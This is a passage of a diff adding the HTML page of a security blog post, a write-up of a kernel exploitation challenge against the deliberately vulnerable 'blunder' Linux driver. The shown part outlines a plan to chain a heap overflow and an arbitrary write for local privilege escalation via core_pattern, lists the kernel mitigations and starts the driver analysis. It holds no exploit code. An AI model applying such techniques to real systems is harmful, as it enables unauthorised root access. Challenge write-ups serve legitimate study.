@@ -1,0 +1,1440 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge) &middot; </title>
+  <meta name="title" content="Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge) &middot; " />
+  
+  <meta name="description" content="An awesome infosec blog :)" />
+  <meta name="keywords" content="Linux-Kernel, Exploitation, Heap-Overflows, " />
+  
+  
+  <link rel="canonical" href="https://mutur4.github.io/posts/linux-kernel-heap-overflow/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.f587ec5880888f327ab22498fc00acc8f48927ec5de6ccc85fe605b27bb9828ecbbcbdb3d383363a5d19cd29f8a8f6a1ec25be7bc3c1171f9cedf72ad3613c0f.css"
+    integrity="sha512-9YfsWICIjzJ6siSY/ACsyPSJJ&#43;xd5szIX&#43;YFsnu5go7LvL2z04M2Ol0ZzSn4qPah7CW&#43;e8PBFx&#43;c7fcq02E8Dw==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.d9c603046c077ebf0e88cb0cc75a77d795076c4f973750e71410c9e530eed5bd3b48204bb18b980da897cb9feb8371ec5cecb0056a738ddf4ab9ed2ac4b331bb.js"
+    integrity="sha512-2cYDBGwHfr8OiMsMx1p315UHbE&#43;XN1DnFBDJ5TDu1b07SCBLsYuYDaiXy5/rg3HsXOywBWpzjd9Kue0qxLMxuw=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.2021de190770621f45a1934d8a7bf9bae8420e3be8bd3e8b0409eeca15e2d25efd112c4c7276b4ab500db338c7afd272beea301310ad15bd98cbf94a9f3dead2.js"
+    integrity="sha512-ICHeGQdwYh9FoZNNinv5uuhCDjvovT6LBAnuyhXi0l79ESxMcna0q1ANszjHr9JyvuowExCtFb2Yy/lKnz3q0g==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge)" />
+<meta property="og:description" content="Introduction #  This blog will be about exploiting a Linux Kernel Driver by chaining a Heap Overflow bug with a &lsquo;sandboxed&rsquo; Arbitrary Address Write (AAW) for Local Priviledge Escalation by overwriting core_pattern with most mitigations enabled." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mutur4.github.io/posts/linux-kernel-heap-overflow/" /><meta property="og:image" content="https://mutur4.github.io/posts/linux-kernel-heap-overflow/featured.jpeg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-21T14:50:44-05:00" />
+<meta property="article:modified_time" content="2024-02-21T14:50:44-05:00" />
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mutur4.github.io/posts/linux-kernel-heap-overflow/featured.jpeg"/>
+<meta name="twitter:title" content="Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge)"/>
+<meta name="twitter:description" content="Introduction #  This blog will be about exploiting a Linux Kernel Driver by chaining a Heap Overflow bug with a &lsquo;sandboxed&rsquo; Arbitrary Address Write (AAW) for Local Priviledge Escalation by overwriting core_pattern with most mitigations enabled."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge)",
+    "headline": "Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge)",
+    
+    "abstract": "Introduction #  This blog will be about exploiting a Linux Kernel Driver by chaining a Heap Overflow bug with a \u0026lsquo;sandboxed\u0026rsquo; Arbitrary Address Write (AAW) for Local Priviledge Escalation by overwriting core_pattern with most mitigations enabled.",
+    "inLanguage": "en",
+    "url" : "https:\/\/mutur4.github.io\/posts\/linux-kernel-heap-overflow\/",
+    "author" : {
+      "@type": "Person",
+      "name": "BinaryChunk"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-02-21T14:50:44-05:00",
+    "datePublished": "2024-02-21T14:50:44-05:00",
+    
+    "dateModified": "2024-02-21T14:50:44-05:00",
+    
+    "keywords": ["Linux-Kernel","Exploitation","Heap-Overflows"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "2926"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="BinaryChunk" />
+  
+  
+  
+  <link href="https://github.com/mutur4" rel="me" />
+  
+  
+  <link href="https://twitter.com/binarychunk" rel="me" />
+  
+  
+  <link href="https://linkedin.com/in/gilbert-robert-m" rel="me" />
+  
+  
+  <link href="https://mastodon.social/@binarychunk" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only"></span>
+
+            <img src="/img/ffz.png" width="50" height="50"
+                class="max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900"></a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Home
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About Me">
+        About
+    </p>
+</a>
+
+
+            
+            
+  <a href="/ctfs/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="CTFs">
+        CTFs
+    </p>
+</a>
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Blog Posts">
+        Posts
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About Me">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/ctfs/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="CTFs">
+            CTFs
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Blog Posts">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+<script>
+    (function () {
+        var $mainmenu = $('.main-menu');
+        var path = window.location.pathname;
+        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
+            $(e).children('p').addClass('active');
+        });
+    })();
+</script>
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+    
+     
+    
+    
+      
+        
+        <img class="w-full rounded-lg single_hero_round nozoom" alt="Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge)" width="1200" height="1200" src="/posts/linux-kernel-heap-overflow/featured_hu20558e68c7a61098b9fcfa7950abd3de_17457_1200x0_resize_q75_box.jpeg">
+        
+    
+    
+  
+  
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/linux-kernel-heap-overflow/"
+      >Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge)</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Linux Kernel: Abusing an AAW and a Heap Overflow for LPE (blunder driver challenge)
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-02-21 14:50:44 -0500 EST">21 February 2024</time><span class="px-2 text-primary-500">&middot;</span><span>2926 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">14 mins</span>
+  
+
+  
+  
+</div>
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux-kernel/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Linux-kernel
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/exploitation/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Exploitation
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/heap-overflows/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    Heap-Overflows
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+  </header>
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+     
+    <div class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky  lg:top-10 ">
+        <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#vulnerable-driver">Vulnerable Driver</a>
+      <ul>
+        <li><a href="#vulnerability-analysis">Vulnerability Analysis</a>
+          <ul>
+            <li><a href="#blunder_open"><em>blunder_open</em></a></li>
+            <li><a href="#blunder_mmap"><em>blunder_mmap</em></a></li>
+          </ul>
+        </li>
+        <li><a href="#heap-buffer-overflow">Heap Buffer Overflow</a>
+          <ul>
+            <li><a href="#elastic-objects"><em>Elastic Objects</em></a></li>
+            <li><a href="#slab-caches"><em>Slab Caches</em></a></li>
+            <li><a href="#msg_msg-objects"><em>msg_msg objects</em></a></li>
+            <li><a href="#shm_file_data"><em>shm_file_data</em></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#heap-grooming-fengshui">Heap (Grooming) Fengshui</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#leaking-addresses"><em>Leaking addresses</em></a></li>
+        <li><a href="#controlling-execution-flow"><em>Controlling Execution flow</em></a>
+          <ul>
+            <li><a href="#overwriting-core_pattern"><em>overwriting core_pattern</em></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#vulnerable-driver">Vulnerable Driver</a>
+      <ul>
+        <li><a href="#vulnerability-analysis">Vulnerability Analysis</a>
+          <ul>
+            <li><a href="#blunder_open"><em>blunder_open</em></a></li>
+            <li><a href="#blunder_mmap"><em>blunder_mmap</em></a></li>
+          </ul>
+        </li>
+        <li><a href="#heap-buffer-overflow">Heap Buffer Overflow</a>
+          <ul>
+            <li><a href="#elastic-objects"><em>Elastic Objects</em></a></li>
+            <li><a href="#slab-caches"><em>Slab Caches</em></a></li>
+            <li><a href="#msg_msg-objects"><em>msg_msg objects</em></a></li>
+            <li><a href="#shm_file_data"><em>shm_file_data</em></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#heap-grooming-fengshui">Heap (Grooming) Fengshui</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#leaking-addresses"><em>Leaking addresses</em></a></li>
+        <li><a href="#controlling-execution-flow"><em>Controlling Execution flow</em></a>
+          <ul>
+            <li><a href="#overwriting-core_pattern"><em>overwriting core_pattern</em></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+ 
+<script>
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = e.attr('id');
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+          
+            $(e).removeClass('active');
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+        
+        onScroll();
+      });
+    }
+  })();
+</script>
+
+      </div>
+      </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        
+
+        <hr>
+<div id="introduction" class="anchor"></div>
+<h1 class="relative group">Introduction 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a></span>        
+    
+</h1>
+<p>This blog will be about exploiting a Linux Kernel Driver by chaining a <strong>Heap Overflow</strong> bug with a &lsquo;sandboxed&rsquo; <strong>Arbitrary Address Write (AAW)</strong> for <strong>Local Priviledge Escalation</strong> by overwriting <strong>core_pattern</strong> with most mitigations enabled.</p>
+<p>It is required that the reader is familiar with basic <strong>Linux Kernel Exploitation</strong> and the structure of the <strong>Kernel Heap</strong> but this is not required since I will try to expound on these topics to the best of my knowledge.</p>
+<div id="vulnerable-driver" class="anchor"></div>
+<h2 class="relative group">Vulnerable Driver 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#vulnerable-driver" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>The vulnerable driver named <code>blunder</code> was part of the exploitation challenges provided by <a href="https://labs.bluefrostsecurity.de"   target="_blank">
+    Blue Frost Security</a> <em>(offensive+con organizers)</em>. The source code and the <code>makefile</code> were provided <a href="https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/"   target="_blank">
+    here</a> for compilation.</p>
+<p>From the provided source code, the driver is somewhat similar to Android&rsquo;s <code>binder</code>/ <code>Linux System V message queue</code> implementing an <strong>Inter Process Communication</strong> mechanism for sending and receiving messages between processes. When the driver is compiled and loaded <code>insmod</code> into the Kernel, this will create an interface at <code>/dev/blunder</code> that can be used to communicate with the driver.</p>
+<p>The driver was compiled on Linux Version <code>5.4.0</code> for this first part of the article, with the following mitigations enabled:</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> <code>SLUB_FREELIST_RANDOMIZATION</code></li>
+<li><input checked="" disabled="" type="checkbox"> <code>CONFIG_CHECKPOINT_RESTORE</code></li>
+<li><input checked="" disabled="" type="checkbox"> <code>USER_HARDENED_COPY</code></li>
+<li><input checked="" disabled="" type="checkbox"> <code>SMEP</code>, <code>SMAP</code>, <code>KPTI</code>, <code>FG-KASLR</code></li>
+</ul>
+<p>The kernel config and the compiled <code>bzImage</code> that were used to develop the final exploit, can be found <a href="https://github.com/mutur4"   target="_blank">
+    here</a></p>
+<div id="vulnerability-analysis" class="anchor"></div>
+<h3 class="relative group">Vulnerability Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#vulnerability-analysis" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>Since the source code of the driver is already provided, we can do some source-code review  with the aim of understanding how the driver works and to check for any present vulnerabilities <em>(mainly where the kernel processes userland data)</em>.</p>
+<p>In summary, when a process sends or receives a message, the following set of actions are performed by the process:</p>
+<ul>
+<li>Opening the device driver <code>/dev/blunder</code> to initialized specific objects.</li>
+<li>Creating a new mapping in the <code>virtual Address Space</code> of the process to send and receive messages.</li>
+<li>The message(s) are sent via ioctl <code>IOCTL_BLUNDER_SEND_MSG</code> and received via <code>IOCTL_BLUNDER_RECV_MSG</code>.</li>
+</ul>
+<p>The following file operations play a major role in implemented the above actions:
+
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/TBpJ1Dd.png" alt="blunder_fops" />
+    
+  </figure>
+
+</p>
